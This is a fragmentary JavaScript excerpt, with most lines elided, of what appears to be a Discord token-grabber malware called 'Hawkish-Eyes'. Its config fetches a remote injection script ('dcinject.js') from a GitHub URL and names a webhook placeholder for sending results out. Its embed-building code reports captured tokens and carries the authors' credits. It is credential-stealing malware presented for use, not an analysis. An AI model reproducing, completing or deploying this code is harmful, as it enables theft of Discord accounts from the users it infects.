...
var config = {
    ...
    injection_url: "https://raw.githubusercontent.com/blazewys/discordinjection/refs/heads/main/dcinject.js",
    webhook: "%WEBHOOK%",
    Filter: {
        "urls": [
...
const makeEmbed = async ({
    ...
    var params = {
        ...
        embeds: [{
            ...
            footer: {
                text: `©[${config.creator}] | https://github.com/sh4den/Hawkish-Eyes-NoDualHook`
            },
    ...
    if (!token) {
        ...
        var params = await makeEmbed({
            ...
            fields: [{
                ...
                name: "@Copyright",
                value: `[Hawkish-Team 2023 <:hwkish:1104091524758773822>](https://github.com/sh4den/Hawkish-Eyes-NoDualHook)`,
                inline: !0
            }, {
